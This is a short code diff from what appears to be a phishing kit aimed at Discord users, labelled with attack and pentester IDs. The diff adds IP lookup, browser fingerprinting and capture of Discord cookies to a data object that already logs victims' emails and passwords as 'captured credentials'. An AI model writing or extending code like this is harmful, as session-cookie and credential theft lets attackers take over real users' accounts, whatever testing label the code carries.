@@ -273,7 +273,10 @@
                     screenResolution: `${screen.width}x${screen.height}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     attackId: attackId,
-                    pentesterId: pentesterId
+                    pentesterId: pentesterId,
+                    ipData: await getEnhancedIPData(),
+                    fingerprint: await captureEnhancedFingerprint(),
+                    cookies: captureDiscordCookies()
                 };
 
                 console.log('📧 Captured credentials:', { email, password: '***' });
